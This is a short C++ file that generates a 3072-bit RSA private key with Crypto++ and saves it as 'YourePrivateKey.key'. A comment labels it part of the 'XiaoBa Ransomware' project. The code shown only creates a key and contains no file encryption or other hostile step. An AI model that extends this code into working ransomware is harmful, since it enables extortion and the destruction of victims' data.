#include <Windows.h>
#include <iostream>
#include <cryptopp/rsa.h>
#include <cryptopp/files.h>
#include <cryptopp/secblock.h>
#include "include.h" //Includes For XiaoBa Ransomware :D
using namespace std;
AutoSeededRandomPool prng;
void Save(const std::string filename, const CryptoPP::BufferedTransformation& bt) {
	CryptoPP::FileSink file(filename.c_str());
	bt.CopyTo(file);
	file.MessageEnd();

}
void SaveKey(const std::string filename, const CryptoPP::RSA::PrivateKey& key) {
	CryptoPP::ByteQueue queue;
	key.Save(queue);
	Save(filename, queue);
}
int main() 
{
	CryptoPP::RSA::PrivateKey rsaPrivate;
	rsaPrivate.GenerateRandomWithKeySize(prng, 3072);
	SaveKey(std::filesystem::current_path().string() + "\\YourePrivateKey.key", rsaPrivate);
	return 0;
}